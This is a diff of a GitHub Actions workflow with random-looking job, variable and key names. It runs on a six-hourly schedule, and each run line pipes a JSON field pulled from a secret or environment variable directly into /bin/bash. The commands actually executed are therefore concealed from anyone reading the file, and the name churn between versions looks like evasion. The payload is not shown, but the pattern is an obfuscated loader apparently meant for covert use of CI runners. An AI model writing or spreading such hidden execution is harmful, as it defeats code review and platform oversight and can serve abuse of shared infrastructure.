@@ -3,7 +3,8 @@ name: meiruren4617
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 0/6 * * *'
+    - cron: '43 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +13,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: meiruren4617
         env:
-          gmkjz63066: ${{ secrets.gmkjz63066 }}
+          b15115: ${{ secrets.b15115 }}
         run: |
-          echo $gmkjz63066 | jq -r .s2 | /bin/bash
-          echo $kffni252 | jq -r .qcyvd294 | /bin/bash
-          echo $mdra708 | jq -r .i130 | /bin/bash
-          echo $xz804 | jq -r .qye61 | /bin/bash
-          echo $gg72605 | jq -r .qf2 | /bin/bash
-          echo $sqpmi4159 | jq -r .n07 | /bin/bash
-          echo $sutt34 | jq -r .ndpd2 | /bin/bash
-          echo $qor03862 | jq -r .zc4780 | /bin/bash
-          echo $tprlt15 | jq -r .zjdt55169 | /bin/bash
-          echo $j2 | jq -r .sb2 | /bin/bash
-          echo $n16414 | jq -r .jgkj3097 | /bin/bash
+          echo $b15115 | jq -r .wwtw7 | /bin/bash
+          echo $o1299 | jq -r .p3 | /bin/bash
+          echo $s65 | jq -r .qmbov9337 | /bin/bash
+          echo $tw8240 | jq -r .sdx6655 | /bin/bash
+          echo $u4443 | jq -r .aa213 | /bin/bash
+          echo $usq5237 | jq -r .hsntp96265 | /bin/bash
+          echo $rr84 | jq -r .ctgui3543 | /bin/bash
+          echo $jb381 | jq -r .w913 | /bin/bash
+          echo $wnj542 | jq -r .yyj4 | /bin/bash
+          echo $l6 | jq -r .abezd4303 | /bin/bash
 
